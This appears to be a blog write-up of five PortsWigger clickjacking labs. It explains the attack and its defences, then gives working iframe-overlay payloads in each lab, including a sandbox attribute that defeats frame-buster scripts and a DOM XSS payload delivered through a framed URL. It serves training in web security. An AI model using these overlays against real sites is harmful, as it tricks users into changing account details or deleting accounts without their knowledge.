---
title: PortsWigger Clickjacking Labs - November 2025
published: 2025-11-15
description: Writeup of Clickjacking.
tags:
  - Clickjacking
  - Burpsuite
  - Caido
image: images/cover.png
category: PortsWigger Labs Writeups
draft: false
---

# Clickjacking

![Pasted image 20251112023200.png](images/Pasted_image_20251112023200.png)

- Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. 
- Consider the following example:
	- A web user accesses a decoy website (perhaps this is a link provided by an email) and clicks on a button to win a prize. 
	- Unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this results in the payment of an account on another site. 
	- This is an example of a clickjacking attack. 
	- The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an `iframe`. 
	- The `iframe` is overlaid on top of the user's anticipated decoy web page content. 
	- This attack differs from a [CSRF](https://portswigger.net/web-security/csrf) attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input.
- It can be blocked by CSP
- Properly Configuring X-Frame-Options in Header
- Frame Buster Scripts which will bust the `iframe` tag.

## Lab 1 : Basic clickjacking with CSRF token protection

![Pasted image 20251109213554.png](images/Pasted_image_20251109213554.png)

- First we will login with given creds,
	- `wiener:peter`


```html
<style>
    iframe {
        position:relative;
        width:1500;
        height: 900;
        opacity: 0.5;
        z-index: 1;
    }
    div {
        position:absolute;
        top:540;
        left:240;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0adb00d6037a92268009dac600620081.web-security-academy.net/my-account"></iframe>
```

- After viewing the exploit, it looks like this

![Pasted image 20251110121903.png](images/Pasted_image_20251110121903.png)

- After reducing `opacity:0.0001` it looks like this,

![Pasted image 20251110122014.png](images/Pasted_image_20251110122014.png)

![Pasted image 20251110122900.png](images/Pasted_image_20251110122900.png)

## Lab 2 : Clickjacking with form input data prefilled from a URL Parameter

![Pasted image 20251110182016.png](images/Pasted_image_20251110182016.png)

- Again as previous lab we have to login using given creds,
	- `wiener:peter`

![Pasted image 20251110182152.png](images/Pasted_image_20251110182152.png)

- Difference between this and previous lab is that we can add email in GET request itself so we will fill our email in it and try to phish the victim to click on,

```html
<style>
    iframe {
        position:relative;
        width:1500;
        height: 900;
        opacity: 0.5;
        z-index: 1;
    }
    div {
        position:absolute;
        top:540;
        left:240;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a1a001903a367bc81a30cca00b000d2.web-security-academy.net/my-account?email=test@test.com"></iframe>
```

- I keep opacity 0.5 so we can how this looks like when email is filled and click button,
- other wise opacity will be 0.0001 so user can't see it

![Pasted image 20251110183445.png](images/Pasted_image_20251110183445.png)

![Pasted image 20251110182748.png](images/Pasted_image_20251110182748.png)

![Pasted image 20251110182801.png](images/Pasted_image_20251110182801.png)

## Lab 3 : Clickjacking with a frame buster script

![Pasted image 20251110183038.png](images/Pasted_image_20251110183038.png)

- Again we will log in with given creds,
	- `wiener:peter`

![Pasted image 20251110183200.png](images/Pasted_image_20251110183200.png)

- So if we try previous technique then it wont work simply,

![Pasted image 20251110183547.png](images/Pasted_image_20251110183547.png)

- So we have to bypass this protection which is `frame buster`.

```html
<style>
    iframe {
        position:relative;
        width:1500;
        height: 900;
        opacity: 0.5;
        z-index: 1;
    }
    div {
        position:absolute;
        top:540;
        left:240;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0ab9005c04cc320681d5e3f50098008e.web-security-academy.net/my-account?email=test@test.com"></iframe>
```

>[!note] 
>Notice the use of the `sandbox="allow-forms"` attribute that neutralizes the frame buster script.

- After doing this it works perfectly,

![Pasted image 20251110184044.png](images/Pasted_image_20251110184044.png)

![Pasted image 20251110184208.png](images/Pasted_image_20251110184208.png)

![Pasted image 20251110184223.png](images/Pasted_image_20251110184223.png)

## Lab 4 : Exploiting clickjacking vulnerability to trigger DOM-based XXS

![Pasted image 20251110184511.png](images/Pasted_image_20251110184511.png)

![Pasted image 20251110184612.png](images/Pasted_image_20251110184612.png)

- It has submit feedback functionality and this lab contains xxs so we have to first check whether it present in this form,

![Pasted image 20251110184825.png](images/Pasted_image_20251110184825.png)

- Name is reflecting so we can try XXS payloads here,

![Pasted image 20251110184836.png](images/Pasted_image_20251110184836.png)

- I tried multiple payloads of XXS but it didn't work until one,
	- `<script>alert(0)</script>` - Failed
	- `<script>alert("0")</script>` - Failed
- `<img src=x onerror=alert(0)>` - Works

![Pasted image 20251110185320.png](images/Pasted_image_20251110185320.png)

![Pasted image 20251110185330.png](images/Pasted_image_20251110185330.png)

- So now we will craft out clickjacking payload,

![Pasted image 20251110191613.png](images/Pasted_image_20251110191613.png)

- here is the whole URL which will goes into POC and we have to invoke `print()` so we replace `onerror` with that.

```http
https://0ab4008404fd821e808c030a0007008f.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult
```

```html
<style>
    iframe {
        position:relative;
        width:1135;
        height: 600;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520;
        left:80;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ab4008404fd821e808c030a0007008f.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

![Pasted image 20251110191807.png](images/Pasted_image_20251110191807.png)

## Lab 5 : Multistap clickjacking

![Pasted image 20251110191837.png](images/Pasted_image_20251110191837.png)

- So again creds is given so we have to login with it,
	- `wiener:peter`

![Pasted image 20251110192026.png](images/Pasted_image_20251110192026.png)

- I try to fill the email field by giving parameters in URL and it works, so we can use this whole url in clickjacking POC

![Pasted image 20251110192303.png](images/Pasted_image_20251110192303.png)


```html
<style>
    iframe {
        position:relative;
        width:1135;
        height: 600;
        opacity: 0.5;
        z-index: 2;
    }
    .div1 {
        position:absolute;
        top:520;
        left:70;
        z-index: 1;
    }
    .div2 {
        position:absolute;
        top:310;
        left:200;
        z-index: 1;
    }
</style>
<div class="div1">Click me first</div>
<div class="div2">Click me next</div>
<iframe src="https://0a3f00ef047ed58581834d2500a600c3.web-security-academy.net/my-account"></iframe>
```

- So there is nothing special but we have to just add two click me which is `Click me first` and `Click me next` for confirmation page.

![Pasted image 20251110193010.png](images/Pasted_image_20251110193010.png)

![Pasted image 20251110192901.png](images/Pasted_image_20251110192901.png)

![Pasted image 20251110192853.png](images/Pasted_image_20251110192853.png)

- Now we will deliver the payload and it work!!

![Pasted image 20251112020941.png](images/Pasted_image_20251112020941.png)
